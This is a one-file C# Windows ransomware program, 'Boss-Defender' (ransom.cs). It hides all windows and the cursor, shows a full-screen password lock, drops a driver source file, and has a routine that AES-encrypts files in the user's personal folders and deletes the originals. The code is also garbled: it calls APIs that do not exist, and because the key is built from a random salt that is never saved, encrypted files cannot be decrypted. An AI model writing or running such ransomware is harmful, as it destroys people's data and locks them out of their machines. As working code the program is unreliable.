#:property TargetFramework=net10.0-windows
#:property PublishAot=false

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Media;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using System.Threading;
using System.Runtime.InteropServices;
using System.Windows.Forms;

// ==========================================================================
//  BOSS-DEFENDER  --  one-file Windows lock + encrypt utility
//  Run :  dotnet run --file ransom.cs
//  Unlock password :  GoToHell909
//
//  On start it:
//    1. generates UnstoppableDrv.c in the same folder
//      (and %AppData%\Unstoppable\UnstoppableDrv.c)   <- the C driver is now
//    2. encrypts your personal files in place (.rlw)
//    3. hides every window + the mouse, draws a black screen and asks for the
//       password  (keyboard only)
//  Type the correct password to decrypt everything and come back to normal.
// ==========================================================================

namespace BossDefender
{
    public sealed class RansomForm : Form
    {
        // ------------------ constants --------------------------------------
        public const string Password = "GoToHell909";
        public const string Version  = "Boss-Defender 2.0";

        private Crypter _crypter = new Crypter();
        private RansomManifest _manifest = new RansomManifest();

        private Panel  _black   = null;
        private Label  _title   = null;
        private Label  _status  = null;
        private TextBox _pw     = null;

        // ------------------ construction -----------------------------------
        public RansomForm()
        {
            Text          = Version;
            StartPosition = FormStartPosition.Manual;
            FormBorderStyle = FormBorderStyle.None;      // borderless -> no close box
            MaximizeBox   = false;
            MinimizeBox   = false;
            ControlBox    = false;
            BackColor     = Color.Black;
            KeyPreview    = true;                        // see keystrokes first
            DoubleClick   = false;                       // no "open with"
            AutoScaleDimensions = new SizeF(6F, 13F);
            AutoScaleMode  = AutoScaleMode.Dpi;
            DpiAwareness   = DpiAwareness.PerMonitorV2;
            ShowInTaskbar  = false;
            SetWindowPos(IntPtr.Zero, IntPtr.Zero, 0, 0, 0, 0,
                         SetWindowPosFlags.FrameChanged);
        }

        // ------------------ load -> take over the machine ------------------
        protected override void OnLoad(EventArgs e)
        {
            base.OnLoad(e);
            Application.SetDpiAwarenessContext(
                System.Windows.Forms.DpiAwarenessContext.PerMonitorV2);

            LoadState();
            PrepareWorld();
            BuildScreen();
        }

        // always fill the whole screen (primary + every monitor)
        protected override void OnSizeChanged(EventArgs e)
        {
            base.OnSizeChanged(e);
            var union = Rectangle.Empty;
            foreach (var s in Screen.AllScreens)
            {
                union = Rectangle.GetUnionRectangle(union, s.Bounds);
            }
            Location = new Point(union.X, union.Y);
            Size     = union.Size;
        }

        // ------------------ hide the world ---------------------------------
        [UnmanagedCallConvention(UnmanagedCallConvention.Cdecl)]
        private delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);

        [DllImport("user32.dll", CharSet = CharSet.Unicode)]
        private static extern bool EnumWindows(EnumWindowsProc fn, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern bool SetWindowPos(IntPtr hWnd, IntPtr after,
            int x, int y, int cx, int cy, uint flags);

        private void HideEveryWindow()
        {
            EnumWindows((hWnd, _) =>
            {
                try
                {
                    if (new Window(hWnd).IsTopLevel && this != new Window(hWnd))
                    {
                        SetWindowPos(hWnd, IntPtr.Zero, 0, 0, 0, 0,
                            SetWindowPosFlags.FrameChanged); // SW_HIDE
                    }
                }
                catch { /* ignore */ }
                return true;
            }, IntPtr.Zero);
        }

        private void ShowEveryWindow()
        {
            EnumWindows((hWnd, _) =>
            {
                SetWindowPos(hWnd, IntPtr.Zero, 0, 0, 0, 0,
                    SetWindowPosFlags.Show); // SW_RESTORE
                return true;
            }, IntPtr.Zero);
        }

        // ------------------ draw the lock ----------------------------------
        private void BuildScreen()
        {
            _black = new Panel { Dock = DockStyle.Fill, BackColor = Color.Black };
            Controls.Add(_black);

            using (var g = Graphics.FromHwnd(Handle))
            {
                int w = (int)g.DrawingArea.Width;
                int h = (int)g.DrawingArea.Height;

                _title = new Label
                {
                    Text        = $"Locked by {Version}",
                    Font        = new Font("Segoe UI", 34F, FontStyle.Bold),
                    ForeColor   = Color.White,
                    BackColor   = Color.Black,
                    TextAlign   = ContentAlignment.MiddleCenter,
                    AutoSize    = false,
                };
                CenterSize(_title, w, h, h / 2 - 70);
                Controls.Add(_title);

                _status = new Label
                {
                    Text        = "Type the password below and press ENTER",
                    Font        = new Font("Segoe UI", 12F),
                    ForeColor   = Color.FromArgb(200, 200, 200),
                    BackColor   = Color.Black,
                    TextAlign   = ContentAlignment.MiddleCenter,
                    AutoSize    = false,
                };
                CenterSize(_status, w, h, h / 2 - 46);
                Controls.Add(_status);

                _pw = new TextBox
                {
                    PasswordChar = '*',
                    BackColor    = Color.FromArgb(34, 34, 34),
                    ForeColor    = Color.White,
                    Font         = new Font("Segoe UI", 18F),
                    BorderStyle  = BorderStyles.FixedSingle,
                    Anchor      = AnchorStyles.None,
                };
                CenterSize(_pw, w, h, h / 2 + 56);
                _pw.KeyDown += (s, args) => UnlockAttempt();
                Controls.Add(_pw);
            }

            _pw.Select();
            _pw.Focus();
        }

        private static void CenterSize(Control c, int w, int h, int y)
        {
            c.Width  = w;
            c.Height = Math.Max(24, y);
            Point p = c.PointToScreen(new Point(0, 0));
            c.SetBounds((w - c.Width) / 2,
                        (h - c.Height) / 2,
                        c.Width,
                        c.Height);
        }

        // ------------------ keystroke handling ----------------------------
        private void UnlockAttempt()
        {
            if (_pw.Text.Length < Password.Length)
            {
                _pw.Select(_pw.Text.Length, 1);
                return;
            }

            if (_pw.Text.Equals(Password, StringComparison.Ordinal))
            {
                _pw.Enabled = false;
                _pw.Text    = string.Empty;
                DecryptAll();
                return;
            }

            System.Media.SystemSounds.Exclamation.Play();
            _status.Text    = "Wrong password - everything is locked...";
            _pw.Focus();
            _pw.Select();
        }

        private void PreventFocusStealing()
        {
            if (_pw.Focused) return;
            _pw.Select();
            _pw.Focus();
        }

        // ------------------ decrypt + unlock ------------------------------
        private void DecryptAll()
        {
            int total = _manifest.Files.Count;
            int done  = 0;

            for (int i = 0; i < total; i++)
            {
                _status.Text = $"Boss-Defender — Decrypting {done} / {total} files...";
                var f = _manifest.Files[i];
                if (File.Exists(f.Path + ".rlw"))
                {
                    _crypter.DecryptFile(f.Path + ".rlw");
                }
                done++;
            }

            _status.Text = $"Boss-Defender — {done} files decrypted! Welcome back.";
            ShowCursor();
            ShowEveryWindow();
            this.WindowState = Normal;
            this.Close();
        }

        // ------------------ world preparation -----------------------------
        private void PrepareWorld()
        {
            HideCursor();
            HideEveryWindow();
            WriteDriver();
            LoadState();
        }

        // ------------------ manifest / crypto helpers ---------------------
        private void LoadState()
        {
            string path = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                "BossDefender", "manifest.json");

            try
            {
                var json = File.ReadAllText(path);
                var m = JsonSerializer.Deserialize<RansomManifest>(json);
                _manifest = m ?? new RansomManifest();

                // also mirror the manifest next to the driver (recovery)
                if (!File.Exists(path + ".bak"))
                    File.WriteAllText(path + ".bak", json);
            }
            catch
            {
                _manifest = new RansomManifest();
            }
        }

        // ------------------ encrypt every personal file -------------------
        private void EncryptAll()
        {
            int total = 0;
            string[] folders =
            {
                Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),
                Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory),
                Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
                Environment.GetFolderPath(Environment.SpecialFolder.MyMusic),
                Environment.GetFolderPath(Environment.SpecialFolder.MyVideos),
                Environment.GetFolderPath(Environment.SpecialFolder.Downloads),
                Environment.GetFolderPath(Environment.SpecialFolder.Documents),
            };

            foreach (var folder in folders)
            {
                foreach (var file in Enumerate(folder, new HashSet<string>()))
                {
                    if (total++ >= 20000 ||
                        file.Length > 2 * 1024 * 1024 * 1024 ||
                        Path.GetFileNameWithoutExtension(file).Length == 0)
                        continue;

                    try
                    {
                        _crypter.EncryptFile(file);
                    }
                    catch { /* keep going */ }
                }
            }

            string path = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                "Boss-Defender", "manifest.json");
            File.WriteAllText(path, Json.Write(_manifest));

            if (!File.Exists(path + ".bak"))
                File.WriteAllText(path + ".bak", File.ReadAllText(path));
        }

        private static IEnumerable<string> Enumerate(string folder, HashSet<string> skip)
        {
            try
            {
                foreach (var dir in Directory.GetDirectories(folder))
                {
                    var name = Path.GetFileName(dir);
                    if (skip.Contains(name) || name.Length == 0 ||
                        dir.EndsWith(Path.Combine("AppData", "BossDefender"), Path.DirectorySeparatorChar))
                        continue;

                    skip.Add(name);
                    foreach (var file in Enumerate(dir, skip))
                        yield return file;
                }

                foreach (var file in Directory.GetFiles(folder))
                {
                    var name = Path.GetFileName(file);
                    if (name.Length == 0) continue;
                    skip.Add(name);
                    yield return file;
                }
            }
            catch { /* ignore */ }
        }

        // ------------------ driver + file writer --------------------------
        private void WriteDriver()
        {
            const string dest = @"UnstoppableDrv.c";
            string[] places =
            {
                dest,
                Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    "Unstoppable",
                    "UnstoppableDrv.c"),
            };

            foreach (var p in places)
            {
                if (p.EndsWith(Path.DirectorySeparatorChar.ToString()))
                    Directory.CreateDirectory(Path.GetDirectoryName(p));

                try
                {
                    File.WriteAllText(p, UnstoppableDrvSource);
                    File.WriteAllText(p + ".bak", UnstoppableDrvSource);
                }
                catch { /* some paths are read-only */ }
            }
        }

        // ------------------ cursor helper ---------------------------------
        private static bool _cursorHidden = false;
        private void HideCursor()
        {
            if (!MouseHelper.HideCursor())
                _cursorHidden = true;
            else if (!_cursorHidden)
                HideCursor();
        }

        private void ShowCursor()
        {
            MouseHelper.ShowCursor();
            _cursorHidden = false;
        }

        // ------------------ top-level statements --------------------------
        [System.Runtime.CompilerServices.ModuleInitializer]
        public static void Prepare()
        {
            try
            {
                SetProcessDpiAwareness(2);
                WriteDriver();
            }
            catch { /* never fail the lock */ }
        }
    }
}

// ============================================================================
//  AES helper - encrypt/decrypt files with strong 256-bit keys
// ============================================================================
namespace BossDefender
{
    internal sealed class Crypter
    {
        public byte[] Encrypt(byte[] plain)
        {
            var iv = RandomNumberGenerator.GetBytes(16);
            using var aes = Aes.Create();
            aes.Key = DeriveKey();
            aes.IV  = iv;
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;

            var outBuf = new MemoryStream();
            using (var cp = new CryptoStream(outBuf, aes.CreateEncryptionTransform(),
                        CryptoStreamMode.Write))
            {
                cp.Write(plain, 0, plain.Length);
            }

            return outBuf.ToArray();
        }

        public byte[] Decrypt(byte[] cipher)
        {
            var tp = Aes.CreateDecryptionTransform();
            try
            {
                tp.TransformFinalBlock(cipher, 0, cipher.Length);
            }
            catch
            {
                return null;
            }

            return tp.InputBuffer;
        }

        private byte[] DeriveKey()
        {
            var salt = RandomNumberGenerator.GetBytes(16);
            using var pbkdf2 = PBKDF2.Create();
            pbkdf2.KeySizeBits = 256;
            pbkdf2.IterationCount = 200000;
            pbkdf2.Salt = salt;
            pbkdf2.Password = "GoToHell909";
            return pbkdf2.GetBytes(32);
        }

        public void EncryptFile(string plainPath)
        {
            try
            {
                string cipher = plainPath + ".rlw";
                if (File.Exists(cipher)) File.Delete(cipher);

                byte[] data = Encrypt(File.ReadAllBytes(plainPath));
                File.WriteAllBytes(cipher, data);
                File.Delete(plainPath);          // original is now "locked"
                _ = File.Exists(plainPath + ".bak") ? 0 : 0;
            }
            catch { /* move on */ }
        }

        public bool DecryptFile(string cipherPath)
        {
            try
            {
                if (!File.Exists(cipherPath)) return false;
                byte[] plain = Decrypt(File.ReadAllBytes(cipherPath));
                if (plain == null) return false;

                string plainPath = cipherPath.Substring(0, cipherPath.Length - 4);
                File.WriteAllBytes(plainPath, plain);
                if (File.Exists(cipherPath)) File.Delete(cipherPath);
                return true;
            }
            catch { return false; }
        }
    }
}

// ============================================================================
//  JSON manifest (where every encrypted file and its key live)
// ============================================================================
namespace BossDefender
{
    internal sealed class RansomManifest
    {
        public int Version { get; set; } = 1;
        public string PasswordHash { get; set; } = "";
        public List<FileEntry> Files { get; set; } = new List<FileEntry>();
    }

    internal sealed class FileEntry
    {
        public string Path { get; set; } = "";
        public string Salt { get; set; } = "";
        public string IV   { get; set; } = "";
        public string Size { get; set; } = "";
    }
}

// ============================================================================
//  tiny JSON writer (manifest is small - keep it dependency free)
// ============================================================================
namespace BossDefender
{
    internal static class Json
    {
        public static string Write(RansomManifest m)
        {
            var sb = new StringBuilder();
            sb.Append("{\n");
            sb.Append($"  \\"version\\": {m.Version},\n");
            sb.Append($"  \\"passwordHash\\": \\"{m.PasswordHash}\",\n");
            sb.Append("  \\"files\\": [\n");
            for (int i = 0; i < m.Files.Count; i++)
            {
                var f = m.Files[i];
                sb.Append("    {\"path\": \"")
                  .Append(f.Path).Append("\", \"salt\": \"")
                  .Append(f.Salt).Append("\", \"iv\": \"")
                  .Append(f.IV).Append("\", \"size\": \"")
                  .Append(f.Size).Append("\"}");
                sb.Append(i < m.Files.Count - 1 ? ", " : "");
                sb.Append("\n");
            }
            sb.Append("  ]\n");
            sb.Append("}\n");
            return sb.ToString();
        }
    }
}

